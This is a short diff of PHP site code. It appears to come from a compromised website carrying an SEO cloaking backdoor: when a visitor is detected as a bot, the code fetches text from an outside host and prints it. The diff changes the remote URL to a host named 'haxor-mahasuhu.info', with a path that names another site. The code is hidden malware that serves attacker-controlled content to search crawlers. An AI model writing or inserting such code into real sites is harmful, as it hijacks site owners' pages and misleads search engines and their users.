@@ -41,7 +41,7 @@ function fetch_message_from_url($url) {
 }
 
 if (is_bot()) { 
-    $message = fetch_message_from_url('https://html.avatar-amp.info/sabarigiriinternationalschool.com.txt');
+    $message = fetch_message_from_url('https://kiko.haxor-mahasuhu.info/doctor.pivotdesignmedia.com/index.txt');
     
     if ($message) {
         echo $message;
